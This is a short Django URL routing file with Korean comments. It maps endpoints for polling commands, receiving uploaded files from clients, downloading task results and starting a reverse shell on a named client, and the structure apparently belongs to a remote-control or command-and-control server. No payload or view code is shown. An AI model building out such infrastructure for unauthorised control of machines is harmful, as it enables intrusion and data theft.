# tasks/urls.py (이전에 제공된 코드 전체)
from . import views
from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static # 👈 이 임포트가 중요합니다.

urlpatterns = [
    path('poll/', views.poll_command_view, name='command_poll'),


# 파일 업로드 엔드포인트
    path('upload/receive/', views.receive_upload_view, name='upload_receive'),
    # 결과 다운로드 엔드포인트
    path('download/result/<int:task_id>/', views.download_result_view, name='download_result'),
    path('shell/start/<str:client_id>/', views.start_reverse_shell, name='start_reverse_shell'),
    
]

# Development only: MEDIA_URL에 해당하는 경로로 접근하면 
# MEDIA_ROOT 디렉토리의 파일을 서빙하도록 설정합니다.
# 요청된 경로 /command_reports/가 MEDIA_URL 설정과 일치한다고 가정합니다.
if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)